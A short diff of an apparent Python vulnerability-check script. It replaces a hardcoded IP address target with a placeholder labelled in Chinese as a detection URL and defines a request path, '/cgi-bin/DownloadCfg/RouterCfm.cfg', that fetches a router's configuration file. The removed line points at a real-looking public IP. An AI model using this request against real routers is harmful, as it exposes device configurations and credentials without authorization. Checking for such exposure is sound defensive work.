@@ -2,7 +2,7 @@ import requests
 import re
 import base64
 
-url = "http://180.126.175.184:8888/"
+url = "检测url"
 payload = "/cgi-bin/DownloadCfg/RouterCfm.cfg"
 
 r1 = requests.get(url)
